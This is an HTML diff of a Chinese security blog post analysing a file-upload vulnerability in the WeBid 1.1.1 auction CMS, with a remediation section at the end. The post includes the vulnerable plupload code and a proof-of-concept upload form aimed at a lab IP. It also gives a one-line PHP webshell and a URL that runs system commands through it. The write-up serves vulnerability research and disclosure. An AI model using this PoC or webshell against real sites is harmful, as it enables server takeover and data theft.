@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://showmeshell.top">
-  <title>Archives: 2018/11 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
+  <title>WeBid 1.1.1 文件上传漏洞 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The Road Of Reverse And Web~">
-<meta name="keywords" content="Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:url" content="http://showmeshell.top/archives/2018/11/index.html">
+  <meta name="description" content="漏洞介绍WeBid WeBid是一个开源的，用于快速搭建拍卖网站的内容管理系统，已超过十万次下载，十分流行。 漏洞介绍 本次漏洞攻击者可以利用上传漏洞上传一句话木马，可以执行命令或者直接获取Webshell，可对用户数据可造成极大的损失。 影响版本 WeBid 1.1.1 漏洞危害 攻击者通过上传木马文件，可以很容易获取WebShell，甚至直接获取服务器权限，对服务器安全造成极大的威胁。 文件上">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WeBid 1.1.1 文件上传漏洞">
+<meta property="og:url" content="http://showmeshell.top/2018/11/30/WeBid-1-1-1-文件上传漏洞/index.html">
 <meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:description" content="The Road Of Reverse And Web~">
+<meta property="og:description" content="漏洞介绍WeBid WeBid是一个开源的，用于快速搭建拍卖网站的内容管理系统，已超过十万次下载，十分流行。 漏洞介绍 本次漏洞攻击者可以利用上传漏洞上传一句话木马，可以执行命令或者直接获取Webshell，可对用户数据可造成极大的损失。 影响版本 WeBid 1.1.1 漏洞危害 攻击者通过上传木马文件，可以很容易获取WebShell，甚至直接获取服务器权限，对服务器安全造成极大的威胁。 文件上">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-11-30T08:08:38.506Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta name="twitter:description" content="The Road Of Reverse And Web~">
+<meta name="twitter:title" content="WeBid 1.1.1 文件上传漏洞">
+<meta name="twitter:description" content="漏洞介绍WeBid WeBid是一个开源的，用于快速搭建拍卖网站的内容管理系统，已超过十万次下载，十分流行。 漏洞介绍 本次漏洞攻击者可以利用上传漏洞上传一句话木马，可以执行命令或者直接获取Webshell，可对用户数据可造成极大的损失。 影响版本 WeBid 1.1.1 漏洞危害 攻击者通过上传木马文件，可以很容易获取WebShell，甚至直接获取服务器权限，对服务器安全造成极大的威胁。 文件上">
   
     <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
   
@@ -148,36 +149,108 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-WeBid-1-1-1-文件上传漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      WeBid 1.1.1 文件上传漏洞
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/30/WeBid-1-1-1-文件上传漏洞/" class="archive-article-date">
+
+        
+        <a href="/2018/11/30/WeBid-1-1-1-文件上传漏洞/" class="archive-article-date">
   	<time datetime="2018-11-30T08:07:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-30</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/30/WeBid-1-1-1-文件上传漏洞/">WeBid 1.1.1 文件上传漏洞</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>WeBid</strong></p>
+<p>WeBid是一个开源的，用于快速搭建拍卖网站的内容管理系统，已超过十万次下载，十分流行。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>本次漏洞攻击者可以利用上传漏洞上传一句话木马，可以执行命令或者直接获取Webshell，可对用户数据可造成极大的损失。</p>
+<p><strong>影响版本</strong></p>
+<p>WeBid 1.1.1</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者通过上传木马文件，可以很容易获取WebShell，甚至直接获取服务器权限，对服务器安全造成极大的威胁。</p>
+<p><strong>文件上传</strong></p>
+<p>1.上传文件是<u>web脚本语言</u>，服务器的web容器解释并执行了上传的脚本，导致代码执行。<br>2.上传文件是<u>Flash的策略文件</u>crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似）<br>3.上传文件是<u>病毒，木马文件</u>，黑客用以诱骗用户或管理员下载执行。<br>4.上传文件是<u>钓鱼图片或包含了脚本的图片</u>，在某些浏览器会做为脚本执行，被用于钓鱼和欺诈。<br>除此之外，还有不如将上传文件做为入口，溢出服务器的后台处理程序，如图片解析模块；或上传合法文件，其包含了php脚本，再通过”本地文件包含漏洞”执行脚本。</p>
+<p><strong>要完成攻击，满足条件：</strong><br>1.上传的文件能够<strong>被web容器解释执行</strong>，所以文件上传后所在的目录要是web容器所覆盖的路径。<br>2.用户<strong>能够从web上访问这个文件</strong>，如果文件上传了但用户无法通过web访问，或者无法得到web容器解释这个脚本，就不能称之为漏洞。<br>3.用户上传的文件若被<strong>安全检查，格式化，图片压缩</strong>等功能改变了内容，则也可能导致攻击不成功。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞出现在<code>ajax.php?do=uploadaucimages</code> ， 代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"><span class="keyword">include</span> $include_path . <span class="string">'functions_ajax.php'</span>;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">'converter'</span>:</span><br><span class="line">  converter_call();</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">'uploadaucimages'</span>:</span><br><span class="line">  <span class="keyword">include</span> $main_path . <span class="string">'inc/plupload/examples/upload.php'</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">'getupldtable'</span>:</span><br><span class="line">  getupldtable();</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先包含了一个｀functions_ajax.php｀，接下来进入｀switch｀选项，使用do进行传参，用的是GET方法，可以看到，在do等于｀uploadaucimages｀时，就会进入下面循环，包含后面的路径。</p>
+<p>因此我们继续跟进<code>upload.php</code> ，位于<code>\inc\plupload\examples\upload.php</code> ，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Expires: Mon, 26 Jul 1997 05:00:00 GMT"</span>);</span><br><span class="line">header(<span class="string">"Last-Modified: "</span> . gmdate(<span class="string">"D, d M Y H:i:s"</span>) . <span class="string">" GMT"</span>);</span><br><span class="line">header(<span class="string">"Cache-Control: no-store, no-cache, must-revalidate"</span>);</span><br><span class="line">header(<span class="string">"Cache-Control: post-check=0, pre-check=0"</span>, <span class="keyword">false</span>);</span><br><span class="line">header(<span class="string">"Pragma: no-cache"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Settings</span></span><br><span class="line"><span class="comment">//$targetDir = ini_get("upload_tmp_dir") . DIRECTORY_SEPARATOR . "plupload";</span></span><br><span class="line">$targetDir = $upload_path . session_id();</span><br><span class="line"></span><br><span class="line"><span class="comment">//$cleanupTargetDir = false; // Remove old files</span></span><br><span class="line"><span class="comment">//$maxFileAge = 60 * 60; // Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5 minutes execution time</span></span><br></pre></td></tr></table></figure>
+<p>在开始输出了一些头部信息，接下来将文件上传的目录和｀PHPSESSID｀拼接起来，赋值给targetDir变量。</p>
+<p>系统这样做是为了让上传者无法得知上传目录，但是PHPSESSID可以在本地查看，并且修改，因此可以控制PHPSESSID，修改上传目录。</p>
+<p>继续往下看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$chunk = <span class="keyword">isset</span>($_REQUEST[<span class="string">"chunk"</span>]) ? $_REQUEST[<span class="string">"chunk"</span>] : <span class="number">0</span>;</span><br><span class="line">$chunks = <span class="keyword">isset</span>($_REQUEST[<span class="string">"chunks"</span>]) ? $_REQUEST[<span class="string">"chunks"</span>] : <span class="number">0</span>;</span><br><span class="line">$fileName = <span class="keyword">isset</span>($_REQUEST[<span class="string">"name"</span>]) ? $_REQUEST[<span class="string">"name"</span>] : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clean the fileName for security reasons</span></span><br><span class="line">$fileName = preg_replace(<span class="string">'/[^\w\._]+/'</span>, <span class="string">''</span>, $fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure the fileName is unique but only if chunking is disabled</span></span><br><span class="line"><span class="keyword">if</span> ($chunks &lt; <span class="number">2</span> &amp;&amp; file_exists($targetDir . DIRECTORY_SEPARATOR . $fileName)) &#123;</span><br><span class="line"> $ext = strrpos($fileName, <span class="string">'.'</span>);</span><br><span class="line"> $fileName_a = substr($fileName, <span class="number">0</span>, $ext);</span><br><span class="line"> $fileName_b = substr($fileName, $ext);</span><br><span class="line"></span><br><span class="line"> $count = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">while</span> (file_exists($targetDir . DIRECTORY_SEPARATOR . $fileName_a . <span class="string">'_'</span> . $count . $fileName_b))</span><br><span class="line">  $count++;</span><br><span class="line"></span><br><span class="line"> $fileName = $fileName_a . <span class="string">'_'</span> . $count . $fileName_b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create target dir</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($targetDir))</span><br><span class="line"> @mkdir($targetDir);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Look for the content type header</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_CONTENT_TYPE"</span>]))</span><br><span class="line"> $contentType = $_SERVER[<span class="string">"HTTP_CONTENT_TYPE"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">"CONTENT_TYPE"</span>]))</span><br><span class="line"> $contentType = $_SERVER[<span class="string">"CONTENT_TYPE"</span>];</span><br></pre></td></tr></table></figure>
+<p>系统从request里面取一个名为name的参数，如果取到则赋值为filename，如果没有取到，则设置为空。接下来对filename使用正则表达式进行过滤。下面的一段代码的意思是保证文件名称的唯一性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// Handle non multipart uploads older WebKit versions didn&apos;t support multipart in HTML5</span><br><span class="line">if (strpos($contentType, &quot;multipart&quot;) !== false) &#123;</span><br><span class="line"> if (isset($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]) &amp;&amp; is_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;])) &#123;</span><br><span class="line">  // Open temp file</span><br><span class="line">  $out = fopen($targetDir . DIRECTORY_SEPARATOR . $fileName, $chunk == 0 ? &quot;wb&quot; : &quot;ab&quot;);</span><br><span class="line">  if ($out) &#123;</span><br><span class="line">   // Read binary input stream and append it to temp file</span><br><span class="line">   $in = fopen($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], &quot;rb&quot;);</span><br><span class="line"></span><br><span class="line">   if ($in) &#123;</span><br><span class="line">    while ($buff = fread($in, 4096))</span><br><span class="line">     fwrite($out, $buff);</span><br><span class="line"></span><br><span class="line">    if (!in_array($fileName, $_SESSION[&apos;UPLOADED_PICTURES&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">     array_push($_SESSION[&apos;UPLOADED_PICTURES&apos;], $fileName);</span><br><span class="line">     if (count($_SESSION[&apos;UPLOADED_PICTURES&apos;]) == 1)</span><br><span class="line">     &#123;</span><br><span class="line">      $_SESSION[&apos;SELL_pict_url_temp&apos;] = $_SESSION[&apos;SELL_pict_url&apos;] = $fileName;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125; else</span><br><span class="line">    die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : &#123;&quot;code&quot;: 101, &quot;message&quot;: &quot;Failed to open input stream.&quot;&#125;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br><span class="line">   fclose($in);</span><br><span class="line">   fclose($out);</span><br><span class="line">   @unlink($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">  &#125; else</span><br><span class="line">   die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : &#123;&quot;code&quot;: 102, &quot;message&quot;: &quot;Failed to open output stream.&quot;&#125;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br><span class="line"> &#125; else</span><br><span class="line">  die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : &#123;&quot;code&quot;: 103, &quot;message&quot;: &quot;Failed to move uploaded file.&quot;&#125;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br></pre></td></tr></table></figure>
+<p>系统首先判断｀contentType｀中有没有｀multipart｀，如果有，则进入if语句循环。然后打开文件，下面循环读取，进行写入，最后关闭文件。</p>
+<p>通过上面的分析，我们可以得出，代码对上传文件做了两点限制：</p>
+<p><strong>1.目标目录。</strong></p>
+<p><strong>2.正则表达式过滤。</strong></p>
+<p>上传目录我们可以通过查看SESSID进行查看，而正则过滤也不是很严格，因此这里可以直接进行绕过，我们可以尝试进行上传。</p>
+<p>但并没有找到上传的页面，可以手动创建一个上传页面：</p>
+<p>创建POC.html，写入如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://172.16.12.2/ajax.php?do=uploadaucimages"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先打开浏览器，将的POC.html直接拖入到浏览器中：</p>
+<p>可以看到浏览、上传按钮。</p>
+<p>接下来再桌面新建文件：<code>shell.php</code>，写入如下一句话：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_REQUEST[fun]($_REQUEST[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这句代码可以将我们输出的参数传递给fun变量，最终执行出cmd命令的效果。</p>
+<p>点击浏览，选择写好的shell.php，进行上传。</p>
+<p>可以看到PHPSESSID，下面构造网站地址，进行访问：</p>
+<p><code>172.16.12.2/uploaded/sessionid/shell.php?fun=system&amp;cmd=whoami</code></p>
+<p>可以看到，成功的执行了命令，上传成功。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>文件上传功能本身没有错，只是在一些条件下会被攻击者利用，从而成为漏洞，根据攻击原理，有以下几点应该注意：</p>
+<p>1：<strong>文件上传的目录设置为不可执行</strong> 只要web容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此此点至关重要。实际中，很多大型网站的上传应用，文件上传后会放到独立的储存上，做静态处理。但对一些小应用，如果存在上传功能，则仍需要多加关注</p>
+<p>2：<strong>判断文件类型</strong>： 判断文件类型时，应结合MIME Type、后缀检查等方式。推荐使用白名单，黑名单的方式已经无数次被证明不可靠。此外，针对图片处理，可以使用亚索函数或者resize函数，在处理图片的同事破坏掉图片中可能包含的HTML代码</p>
+<p>3：<strong>使用随机数改写文件名和文件路径</strong> 文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用使用随机函数改写了文件名和路径，将极大增加攻击成本。与此同时，像<code>1.php.rar.rar</code>、或者<code>1.xml</code>这种文件，都因为文件名被改写而无法成功实施攻击</p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/zhifubao.jpeg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/weixin.jpeg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -189,475 +262,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/11/30/WeBid-1-1-1-文件上传漏洞/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/29/PHPYun-XML-注入漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-29T07:02:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-29</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/11/29/PHPYun-XML-注入漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHPYun XML 注入漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/29/PHPYun-XML-注入漏洞/">PHPYun XML 注入漏洞</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/29/Bash-4-3-远程命令执行漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-29T06:05:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/29/Bash-4-3-远程命令执行漏洞/">Bash 4.3 远程命令执行漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/27/D-link-路由器-CSRF漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-27T06:35:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/27/D-link-路由器-CSRF漏洞/">D-link 路由器 CSRF漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-27T05:46:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">BlueCMS 1.6 SQL 注入漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/26/PHPCMS2008-SQL注入漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-26T06:35:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/26/PHPCMS2008-SQL注入漏洞/">PHPCMS2008 SQL注入漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-26T05:33:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/">DedeCMS 5.7 反射型XSS漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/26/原则/" class="archive-article-date">
-  	<time datetime="2018-11-26T03:51:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
